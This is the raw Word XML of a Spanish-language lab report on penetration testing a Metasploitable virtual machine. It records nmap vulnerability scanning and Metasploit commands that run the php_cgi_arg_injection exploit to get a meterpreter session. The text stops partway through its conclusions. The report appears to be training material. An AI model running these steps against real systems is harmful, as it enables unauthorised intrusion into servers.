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0EBF8" w14:textId="17FB2A37" w:rsidR="00965FE5" w:rsidRPr="00965FE5" w:rsidRDefault="005B2D99" w:rsidP="00965FE5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>A.H</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EA72E14" w14:textId="1E9FB445" w:rsidR="00864191" w:rsidRPr="00864191" w:rsidRDefault="00000000" w:rsidP="00864191">
      <w:pPr>
        <w:pStyle w:val="Ttulo"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Informe Técnico de Explotación en Metasploitable</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="054642F3" w14:textId="1C304E45" w:rsidR="00864191" w:rsidRPr="00864191" w:rsidRDefault="00864191">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00864191">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Objetivo del ejercicio:</w:t>
      </w:r>
      <w:r w:rsidRPr="00864191">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br/>
        <w:t>Realizar una prueba controlada de penetración sobre una máquina vulnerable (</w:t>
      </w:r>
      <w:r w:rsidRPr="00864191">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Metasploitable)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00864191">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>con el fin de evaluar riesgos asociados a servicios web expuestos.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B34936B" w14:textId="3E05F2F4" w:rsidR="0066584C" w:rsidRPr="00965FE5" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">IP Atacante: </w:t>
      </w:r>
      <w:r w:rsidR="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>10.0.2.15</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B086DD4" w14:textId="77777777" w:rsidR="0066584C" w:rsidRPr="00965FE5" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>IP Víctima: 10.0.2.9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D6A1E87" w14:textId="77777777" w:rsidR="0066584C" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Puerto objetivo: 80 (HTTP)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CDFE7DB" w14:textId="058EF621" w:rsidR="00965FE5" w:rsidRPr="00965FE5" w:rsidRDefault="00965FE5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Ping realizado para comprobar conexión entre ambas máquinas</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EA715E9" w14:textId="77777777" w:rsidR="00864191" w:rsidRDefault="00864191" w:rsidP="00965FE5">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4833E3E0" w14:textId="77777777" w:rsidR="00864191" w:rsidRDefault="00864191" w:rsidP="00965FE5">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3BA6A3F6" w14:textId="77777777" w:rsidR="00864191" w:rsidRDefault="00864191" w:rsidP="00965FE5">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="57FC6798" w14:textId="77777777" w:rsidR="00864191" w:rsidRDefault="00864191" w:rsidP="00965FE5">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0978DCBC" w14:textId="77777777" w:rsidR="00864191" w:rsidRDefault="00864191" w:rsidP="00965FE5">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="593493AD" w14:textId="77777777" w:rsidR="00864191" w:rsidRDefault="00864191" w:rsidP="00864191">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44C26454" w14:textId="77777777" w:rsidR="00864191" w:rsidRDefault="00864191" w:rsidP="00864191">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="57865C0E" w14:textId="77777777" w:rsidR="00864191" w:rsidRDefault="00864191" w:rsidP="00864191">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="389ADD40" w14:textId="77777777" w:rsidR="00864191" w:rsidRPr="00864191" w:rsidRDefault="00864191" w:rsidP="00864191">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24B04CF2" w14:textId="77777777" w:rsidR="005B2D99" w:rsidRDefault="005B2D99" w:rsidP="00965FE5">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66A027FF" w14:textId="198F2CA4" w:rsidR="00965FE5" w:rsidRPr="00965FE5" w:rsidRDefault="00864191" w:rsidP="00965FE5">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>aso 1 – Detección de Servicios y Vulnerabilidades</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13E447C8" w14:textId="77777777" w:rsidR="0066584C" w:rsidRPr="00965FE5" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Se utilizó el comando `nmap` para escanear el puerto 80 y detectar posibles vulnerabilidades mediante el script `vulners`:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37A2866B" w14:textId="77777777" w:rsidR="0066584C" w:rsidRPr="00965FE5" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>sudo nmap -sV --script vulners -p 80 10.0.2.9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="710B8AA3" w14:textId="77777777" w:rsidR="0066584C" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Este escaneo permite identificar la versión del servidor Apache expuesto por la máquina víctima y los CVEs asociados a dicha versión.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53903362" w14:textId="77777777" w:rsidR="00965FE5" w:rsidRDefault="00965FE5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="11777795" w14:textId="0570CEC9" w:rsidR="00965FE5" w:rsidRPr="00965FE5" w:rsidRDefault="00965FE5" w:rsidP="00965FE5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="74E1B206" wp14:editId="6BB498DF">
            <wp:extent cx="5486400" cy="2760345"/>
            <wp:effectExtent l="0" t="0" r="0" b="1905"/>
            <wp:docPr id="92524053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40539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92FF0" w14:textId="77777777" w:rsidR="00965FE5" w:rsidRPr="00965FE5" w:rsidRDefault="00965FE5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2257E1B7" w14:textId="77777777" w:rsidR="00864191" w:rsidRDefault="00864191">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="665EFAF0" w14:textId="77777777" w:rsidR="00864191" w:rsidRDefault="00864191">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="41B4810A" w14:textId="77777777" w:rsidR="00864191" w:rsidRDefault="00864191" w:rsidP="00864191">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2AD4C25F" w14:textId="77777777" w:rsidR="00864191" w:rsidRDefault="00864191" w:rsidP="00864191">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6787CBE3" w14:textId="77777777" w:rsidR="00864191" w:rsidRDefault="00864191" w:rsidP="00864191">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="742B15FB" w14:textId="77777777" w:rsidR="00864191" w:rsidRPr="00864191" w:rsidRDefault="00864191" w:rsidP="00864191">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2FFBBA47" w14:textId="7165B85F" w:rsidR="0066584C" w:rsidRPr="00965FE5" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Paso 2 – Enumeración con Metasploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FD0CE54" w14:textId="77777777" w:rsidR="00864191" w:rsidRPr="00965FE5" w:rsidRDefault="00000000" w:rsidP="00864191">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Con el servicio Apache identificado, se lanza Metasploit Framework</w:t>
      </w:r>
      <w:r w:rsidR="00864191">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> mediante el comando </w:t>
      </w:r>
      <w:r w:rsidR="00864191" w:rsidRPr="00864191">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>msfconsole</w:t>
      </w:r>
      <w:r w:rsidR="00864191">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> y s</w:t>
      </w:r>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>e busca el módulo auxiliar para obtener la versión HTTP del servidor</w:t>
      </w:r>
      <w:r w:rsidR="00864191">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> mediante el comando </w:t>
      </w:r>
      <w:r w:rsidR="00864191" w:rsidRPr="00864191">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>search http_version</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6760616A" w14:textId="488850FF" w:rsidR="0066584C" w:rsidRPr="00965FE5" w:rsidRDefault="0066584C">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6BEC23C8" w14:textId="77777777" w:rsidR="0066584C" w:rsidRPr="00965FE5" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Se selecciona y configura el módulo:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D25B181" w14:textId="77777777" w:rsidR="0066584C" w:rsidRDefault="00000000">
      <w:r>
        <w:t>use auxiliary/scanner/http/http_version</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>set RHOSTS 10.0.2.9</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>run</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A1799D4" w14:textId="77777777" w:rsidR="0066584C" w:rsidRPr="00965FE5" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Posteriormente se realiza una búsqueda más específica:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46750613" w14:textId="77777777" w:rsidR="0066584C" w:rsidRPr="00965FE5" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>search php_cgi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1276D940" w14:textId="77777777" w:rsidR="0066584C" w:rsidRPr="00965FE5" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Se selecciona un exploit disponible:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C80A728" w14:textId="77777777" w:rsidR="00965FE5" w:rsidRDefault="00000000" w:rsidP="00965FE5">
      <w:r>
        <w:t>use exploit/multi/http/php_cgi_arg_injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38A1C4B3" w14:textId="21E79660" w:rsidR="00965FE5" w:rsidRPr="00965FE5" w:rsidRDefault="00965FE5" w:rsidP="00965FE5">
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="310F7254" wp14:editId="229AA639">
            <wp:extent cx="5486400" cy="2760345"/>
            <wp:effectExtent l="0" t="0" r="0" b="1905"/>
            <wp:docPr id="123188279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82796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937A0" w14:textId="3103EC1B" w:rsidR="0066584C" w:rsidRDefault="0066584C"/>
    <w:p w14:paraId="2BB7A814" w14:textId="77777777" w:rsidR="00965FE5" w:rsidRDefault="00965FE5"/>
    <w:p w14:paraId="2CCC787C" w14:textId="77777777" w:rsidR="00965FE5" w:rsidRPr="00965FE5" w:rsidRDefault="00965FE5">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45C00A4A" w14:textId="77777777" w:rsidR="00965FE5" w:rsidRPr="00965FE5" w:rsidRDefault="00965FE5">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E7A430B" w14:textId="77777777" w:rsidR="00965FE5" w:rsidRPr="00965FE5" w:rsidRDefault="00965FE5" w:rsidP="00965FE5"/>
    <w:p w14:paraId="6CDEBB1B" w14:textId="54DBC902" w:rsidR="0066584C" w:rsidRPr="00965FE5" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Paso 3 – Configuración y Ejecución del Exploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37BCFAC9" w14:textId="36854BB9" w:rsidR="0066584C" w:rsidRPr="00965FE5" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Se muestran y configuran las opciones del módulo</w:t>
      </w:r>
      <w:r w:rsidR="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> mediante </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>show</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> options</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29F09B8F" w14:textId="77777777" w:rsidR="0066584C" w:rsidRPr="00965FE5" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Opciones principales configuradas:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E8C8A0E" w14:textId="5A6E0B3F" w:rsidR="0066584C" w:rsidRPr="00965FE5" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>- RHOSTS: 10.0.2.9</w:t>
      </w:r>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br/>
        <w:t>- RPORT: 80</w:t>
      </w:r>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">- LHOST: </w:t>
      </w:r>
      <w:r w:rsidR="00965FE5" w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>10.0.2.15</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BC75325" w14:textId="43B34591" w:rsidR="00965FE5" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Una vez listo, se ejecuta el exploit</w:t>
      </w:r>
      <w:r w:rsidR="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> con el comando run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="457DC210" w14:textId="4F80A105" w:rsidR="0066584C" w:rsidRPr="00965FE5" w:rsidRDefault="00965FE5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5EF87619" wp14:editId="77AE5756">
            <wp:extent cx="5486400" cy="2760345"/>
            <wp:effectExtent l="0" t="0" r="0" b="1905"/>
            <wp:docPr id="89297002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70020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7CDCE" w14:textId="5B163DD8" w:rsidR="00965FE5" w:rsidRPr="00965FE5" w:rsidRDefault="00965FE5" w:rsidP="00965FE5">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59FBD263" w14:textId="77777777" w:rsidR="00864191" w:rsidRDefault="00864191">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2ED0B156" w14:textId="77777777" w:rsidR="00864191" w:rsidRDefault="00864191" w:rsidP="00864191">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24456FC0" w14:textId="77777777" w:rsidR="00864191" w:rsidRDefault="00864191" w:rsidP="00864191">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30CCF0A6" w14:textId="77777777" w:rsidR="00864191" w:rsidRDefault="00864191" w:rsidP="00864191">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B56AED6" w14:textId="77777777" w:rsidR="00864191" w:rsidRDefault="00864191" w:rsidP="00864191">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0AB61B81" w14:textId="77777777" w:rsidR="00864191" w:rsidRDefault="00864191" w:rsidP="00864191">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39BF74C8" w14:textId="77777777" w:rsidR="00864191" w:rsidRPr="00864191" w:rsidRDefault="00864191" w:rsidP="00864191">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5937AAE2" w14:textId="4D23302B" w:rsidR="0066584C" w:rsidRPr="00965FE5" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Paso 4 – Acceso a la Máquina Víctima con Meterpreter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47A377EB" w14:textId="77777777" w:rsidR="0066584C" w:rsidRPr="00965FE5" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Una vez lanzado el exploit correctamente, se obtiene una sesión de `meterpreter`. Se verifican los comandos básicos:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="653C47B6" w14:textId="7709EEB2" w:rsidR="0066584C" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>ls -l         Muestra los archivos del directorio actual</w:t>
      </w:r>
      <w:r w:rsidR="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> y sus permisos</w:t>
      </w:r>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>sysinfo  Muestra</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> información del sistema comprometido</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AEDBDB0" w14:textId="77777777" w:rsidR="00965FE5" w:rsidRDefault="00965FE5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27804F5B" w14:textId="08409D17" w:rsidR="00965FE5" w:rsidRPr="00965FE5" w:rsidRDefault="00965FE5" w:rsidP="00965FE5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5EF2E677" wp14:editId="16E1735C">
            <wp:extent cx="5486400" cy="2760345"/>
            <wp:effectExtent l="0" t="0" r="0" b="1905"/>
            <wp:docPr id="157222244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22447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1577B" w14:textId="77777777" w:rsidR="00965FE5" w:rsidRPr="00965FE5" w:rsidRDefault="00965FE5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51156D11" w14:textId="77777777" w:rsidR="00864191" w:rsidRDefault="00864191">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68396FD5" w14:textId="2CC307F8" w:rsidR="0066584C" w:rsidRPr="00965FE5" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Conclusiones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E841C7C" w14:textId="77777777" w:rsidR="0066584C" w:rsidRPr="00965FE5" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>- Se detectaron vulnerabilidades en el servicio web Apache (puerto 80).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D45C6A5" w14:textId="77777777" w:rsidR="0066584C" w:rsidRPr="00965FE5" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>- Se utilizó Metasploit para explotar una vulnerabilidad (`php_cgi_arg_injection`).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68E27CAF" w14:textId="77777777" w:rsidR="0066584C" w:rsidRPr="00965FE5" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
